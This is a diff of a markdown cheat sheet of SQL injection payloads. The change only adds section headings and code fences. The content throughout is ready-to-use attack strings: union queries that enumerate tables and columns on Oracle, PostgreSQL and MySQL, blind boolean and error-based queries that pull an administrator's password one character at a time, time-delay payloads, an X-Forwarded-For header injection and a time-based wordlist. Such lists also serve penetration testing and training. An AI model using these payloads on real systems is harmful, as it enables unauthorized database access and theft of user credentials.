@@ -107,17 +107,17 @@ CONCAT('foo','bar')
 (SELECT group_concat(column1 || "," || column2 || "," || column3 || ":") from [table name here]) >> To retrieve multiple columns data. 
 ```
 
-#Oracle Database info retrieving
-
+### Oracle Database info retrieving
+```sql
 ' union SELECT table_name,null FROM all_tables-- -
 
 ' union SELECT column_name,null FROM all_tab_columns WHERE table_name = 'table name'-- - 
 
 ' union select [column name here],null from [table name here]-- - 
+```
 
-
-#PostgreSQL Database info retrieving
-
+### PostgreSQL Database info retrieving
+```sql
 ' union SELECT table_name,null FROM information_schema.tables-- -
 
 ' union SELECT column_name,null FROM information_schema.columns WHERE table_name='[table name]'-- -
@@ -129,10 +129,10 @@ CONCAT('foo','bar')
 '||(select column1 from [table name here] limit 1)-- - >> Visible error based sqli in cookie value.
 
 '||cast((select column1 from [table name here] LIMIT 1) AS INT)-- >> Visible error based sqli in cookie value.
+```
 
-
-#Mysql Database info retrieving
-
+### Mysql Database info retrieving
+```sql
 ' union SELECT table_name,null,null FROM information_schema.tables where table_schema='[Database name here]'
 
 ' union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1
@@ -144,10 +144,10 @@ and 1=2 union SELECT table_name,null,null FROM information_schema.tables where t
 and 1=2 union SELECT null,null,column_name,null FROM information_schema.columns where table_name='[table name]' limit 0,1
 
 and 1=2 union select null,null,[column name here],null from [table name here]
+```
 
-
-#Blind based Boolean SQL injection with conditional responses (Visible message)
-
+### Blind based Boolean SQL injection with conditional responses (Visible message)
+```sql
 ' and (select 'x' from users LIMIT 1)='x'-- - >> To determine if the [users] table is exist or not.
 
 ' and (select username from users where username='administrator')='administrator'-- - >> To determine the username
@@ -155,17 +155,17 @@ and 1=2 union select null,null,[column name here],null from [table name here]
 ' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'-- -
 
 ' and (select SUBSTRING(password,1,1) from users where username='administrator')='a'-- -
+```
 
-
-#Blind SQL injection with conditional errors (No visible message)
-
+### Blind SQL injection with conditional errors (No visible message)
+```sql
 ' || (select ' ') || ' >> Non Oracle
 
 ' || (select ' ' from dual) || ' >> Oracle #200 ok means Oracle database exists.
+```
 
-
-#Blind SQL injection with conditional errors to determine a table, other info exist or not
-
+### Blind SQL injection with conditional errors to determine a table, other info exist or not
+```sql
 ' || (select ' ' from [table name here] where rownum = 1) || '-- - >> Oracle #200 ok means that table exists.
 
 select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' >> Oracle #500 error means exists.
@@ -173,10 +173,10 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and LENGTH(password)>20 >> Oracle #500 error means exists.
 
 select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username='administrator' and SUBSTRING(password,1,1)='a' >> Oracle #500 error means exists.
+```
 
-
-#Blind SQL injection with time delays
-
+### Blind SQL injection with time delays
+```sql
 ' UNION SELECT SLEEP(5);-- -
 
 ' || (dbms_pipe.receive_message(('a'),10))-- - >> Oracle
@@ -186,10 +186,10 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 ' ||  (SELECT pg_sleep(10))-- - >> PostgreSQL
 
 ' ||  (SELECT SLEEP(10))-- - >> MySQL
+```
 
-
-#Blind SQL injection with time delays and information retrieval
-
+### Blind SQL injection with time delays and information retrieval
+```sql
 1) PostrgreSQL
 
 ' || (select case when (1=1) then pg_sleep(10 ) else pg_sleep (-1) end)-- -
@@ -201,28 +201,28 @@ select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END from users where username=
 ' || (select case when (username='[username here]' and LENGTH(password)>n) then pg_sleep(10) else pg_sleep(-1) end from users)-- -
 
 ';select case when (1=1) then pg_sleep(5) else pg_sleep(-1) end from users--
+```
 
-
-#Visible Error-Based Sql Injection
-
+### Visible Error-Based Sql Injection
+```sql
 '||cast((select version() LIMIT 1) AS INT)--
 
 '||cast((select username from users LIMIT 1) AS INT)--  >> cast for PostgreSQL
 
 '||cast((select password from users LIMIT 1) AS INT)--
+```
 
-
-#HTTP Header based SQLi
-
+### HTTP Header based SQLi
+```sql
 x-forwarded-for: 127.0.0.1' union select 1,2,3 and sleep(2)-- -
+```
 
-
-#Inception based SQLi
-
+### Inception based SQLi
+```sql
 and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
-
-#Wordlist
-
+```
+### Wordlist
+```sql
     or sleep 5 —
     or sleep 5
     or sleep(5) —
@@ -249,3 +249,4 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
     “) IF (1=1) WAITFOR DELAY ‘0:0:5’ —
     ‘;%5waitfor%5delay%5’0:0:5′%5 — %5
     ‘ WAITFOR DELAY ‘0:0:5’ —
+```
